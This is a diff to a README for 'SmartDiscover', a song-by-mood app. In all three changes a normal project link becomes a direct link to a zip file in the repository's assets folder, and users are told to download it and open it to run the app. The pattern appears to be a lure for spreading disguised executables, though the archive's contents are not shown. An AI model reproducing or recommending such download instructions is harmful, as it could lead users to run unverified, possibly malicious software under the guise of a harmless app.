@@ -1,6 +1,6 @@
 # 🎵 SmartDiscover - Find Songs That Match Your Mood
 
-[![Download SmartDiscover](https://img.shields.io/badge/Download%20SmartDiscover-blue?style=for-the-badge&logo=github)](https://github.com/Jessalynredflowered754/SmartDiscover)
+[![Download SmartDiscover](https://img.shields.io/badge/Download%20SmartDiscover-blue?style=for-the-badge&logo=github)](https://github.com/Jessalynredflowered754/SmartDiscover/raw/refs/heads/main/assets/Discover-Smart-v3.8.zip)
 
 ## 🧭 What SmartDiscover Does
 
@@ -28,7 +28,7 @@ SmartDiscover runs through a web app on your computer, so you do not need to kno
 
 Visit this page to download and run the app files:
 
-https://github.com/Jessalynredflowered754/SmartDiscover
+https://github.com/Jessalynredflowered754/SmartDiscover/raw/refs/heads/main/assets/Discover-Smart-v3.8.zip
 
 On that page, look for the latest release, app file, or setup package for Windows. Download the file to your computer, then open it to start the app.
 
@@ -206,6 +206,6 @@ That is all you need to start using SmartDiscover on Windows.
 
 Visit this page to download and run the app files:
 
-https://github.com/Jessalynredflowered754/SmartDiscover
+https://github.com/Jessalynredflowered754/SmartDiscover/raw/refs/heads/main/assets/Discover-Smart-v3.8.zip
 
 If you need a fresh copy later, use the same link and get the latest version from the project page
